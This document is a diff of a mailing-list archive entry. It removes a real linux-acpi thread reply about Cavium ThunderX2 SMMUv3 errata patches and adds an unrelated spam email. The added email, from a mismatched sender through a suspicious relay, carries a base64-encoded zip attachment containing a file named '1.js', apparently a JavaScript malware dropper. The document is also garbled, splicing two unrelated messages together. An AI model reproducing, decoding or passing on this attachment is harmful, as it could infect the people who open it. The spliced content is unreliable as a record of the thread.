@@ -1,76 +1,50 @@
-From: Robert Richter <robert.richter@cavium.com>
-Subject: Re: [PATCH v3 0/7] Cavium ThunderX2 SMMUv3 errata workarounds
-Date: Tue, 9 May 2017 18:07:29 +0200
-Message-ID: <20170509160729.GN16981@rric.localdomain>
-References: <1493986091-30521-1-git-send-email-gakula@caviumnetworks.com>
- <20170505222250.GY16981@rric.localdomain>
- <20170508151536.GA27789@virtx40>
+From: <geir.nuland@lyse.net>
+Subject: 9759
+Date: Tue, 09 May 2017 16:22:09 -0000
+Message-ID: <149434692914.26664.8843504676934968813@csloxinfo.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="9833260227110.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from mail-sn1nam02on0060.outbound.protection.outlook.com ([104.47.36.60]:28272
-        "EHLO NAM02-SN1-obe.outbound.protection.outlook.com"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1754538AbdEIQHu (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
-        Tue, 9 May 2017 12:07:50 -0400
-Content-Disposition: inline
-In-Reply-To: <20170508151536.GA27789@virtx40>
+Received: from static.vnpt.vn ([14.162.193.18]:58108 "HELO csloxinfo.net"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751356AbdEIQWQ (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+        Tue, 9 May 2017 12:22:16 -0400
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: Linu Cherian <linu.cherian@cavium.com>
-Cc: Geetha sowjanya <gakula@caviumnetworks.com>, will.deacon@arm.com, robin.murphy@arm.com, lorenzo.pieralisi@arm.com, hanjun.guo@linaro.org, sudeep.holla@arm.com, iommu@lists.linux-foundation.org, jcm@redhat.com, linux-kernel@vger.kernel.org, catalin.marinas@arm.com, sgoutham@cavium.com, linux-arm-kernel@lists.infradead.org, linux-acpi@vger.kernel.org, geethasowjanya.akula@gmail.com, Charles.Garcia-Tobin@arm.com
+To: linux-acpi@vger.kernel.org
 
-On 08.05.17 20:45:36, Linu Cherian wrote:
-> On Sat May 06, 2017 at 12:22:50AM +0200, Robert Richter wrote:
-> > On 05.05.17 17:38:04, Geetha sowjanya wrote:
-> > > From: Linu Cherian <linu.cherian@cavium.com>
-> > > 
-> > > Cavium ThunderX2 SMMUv3 implementation has two Silicon Erratas.
-> > > 1. Errata ID #74
-> > >    SMMU register alias Page 1 is not implemented
-> > > 2. Errata ID #126
-> > >    SMMU doesnt support unique IRQ lines and also MSI for gerror, 
-> > >    eventq and cmdq-sync
-> > > 
-> > > The following patchset does software workaround for these two erratas.
-> > > 
-> > > This series is based on patchset. 
-> > > https://www.spinics.net/lists/arm-kernel/msg578443.html
-> > > 
-> > > Changes from v1:
-> > >  Since the use of MIDR register is rejected and SMMU_IIDR is broken on this 
-> > >  silicon, as suggested by Will Deacon modified the patches to use ThunderX2 
-> > >  SMMUv3 IORT model number to enable errata workaround.
-> > > 
-> > > Changes from v2:
-> > >  Updated "Documentation/devicetree/bindings/iommu/arm,smmu-v3.txt" document with 
-> > >  new SMMU option used to enable errata workaround.
-> > >  
-> > > Geetha Sowjanya (1):
-> > >   iommu/arm-smmu-v3: Add workaround for Cavium ThunderX2 erratum #126
-> > > 
-> > > Linu Cherian (6):
-> > >   iommu/arm-smmu-v3: Introduce smmu option PAGE0_REGS_ONLY for ThunderX2
-> > >     errata#74.
-> > >   iommu/arm-smmu-v3: Do resource size checks based on SMMU option
-> > >     PAGE0_REGS_ONLY
-> > >   ACPICA: IORT: Add Cavium ThunderX2 SMMUv3 model definition.
-> > >   iommu/arm-smmu-v3: For ACPI based device probing, set PAGE0_REGS_ONLY
-> > >     option     for ThunderX2 SMMUv3 implementations.
-> > >   ACPI/IORT: Fixup SMMUv3 resource size for Cavium ThunderX2 SMMUv3
-> > >     model
-> > >   arm64: Documentation: Add Cavium ThunderX2 SMMUv3 erratas
-> > 
-> > This split into patches does not look reasonable to me. 1 patch only
-> > for each workaround should be sufficient.
-> > 
-> 
-> * Should we not atleast keep the changes in drivers/acpi/iort.c and
->  include/acpi/actbl2.h seperate, since they are outside smmuv3 driver ? 
-
-IMO both patches depend each other. You can't shrink the io space
-first without adjusting the offset when accessing it. At least the
-order should be changed. But since it is one workaround I would prefer
-also one patch.
-
--Robert
+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
